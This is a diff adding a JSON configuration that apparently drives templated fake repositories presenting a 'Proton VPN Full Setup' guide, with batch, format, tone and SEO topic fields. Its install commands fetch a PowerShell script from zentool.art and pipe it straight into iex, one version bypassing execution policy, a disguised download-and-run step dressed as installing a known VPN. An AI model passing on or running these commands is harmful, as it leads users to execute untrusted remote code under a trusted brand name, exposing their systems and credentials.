@@ -1,0 +1,28 @@
+{
+  "repo": "Proton-VPN-Full-Setup",
+  "product": "Proton VPN Full Setup",
+  "product_title": "Proton VPN",
+  "kind": "security",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "vpn",
+  "topics": [
+    "proton-vpn-windows",
+    "proton-config",
+    "proton-integration",
+    "proton-latest",
+    "vpn-client",
+    "privacy",
+    "network-tunnel",
+    "secure-browsing",
+    "windows-vpn",
+    "wireguard",
+    "openvpn",
+    "network-privacy"
+  ],
+  "site": "zentool.art"
+}
